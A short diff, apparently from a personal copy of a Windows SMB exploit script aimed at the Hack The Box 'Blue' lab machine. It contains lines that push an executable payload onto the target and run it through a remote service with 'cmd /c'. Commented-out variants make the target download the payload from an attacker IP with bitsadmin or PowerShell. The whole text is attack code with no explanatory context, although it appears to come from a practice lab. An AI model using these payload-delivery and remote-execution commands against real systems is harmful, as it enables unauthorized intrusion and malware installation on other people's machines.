@@ -1,0 +1,15 @@
+36c36
+< USERNAME = 'user'
+---
+> USERNAME = ''
+923d922
+< 	smb_send_file(smbConn, '/home/pat/Desktop/Cert_Prep/htb/Windows/Blue/101014184444.exe', 'C', '/101014184444.exe')
+925,927d923
+<         #service_exec(conn, r'cmd /c bitsadmin /transfer pwn /download http://10.10.14.18/101014184444.exe C:\101014184444.exe')
+< 	#service_exec(conn, r'powershell -NoLogo -Command "$webClient = new-object System.Net.WebClient; $webClient.DownloadFile(\'http://10.10.14.18/101014184444.exe\', \'C:\101014184444.exe\')"')
+< 	service_exec(conn, r'cmd /c /101014184444.exe')
+1003c999
+< print('Done')
+---
+> print('Done')
+\ No newline at end of file
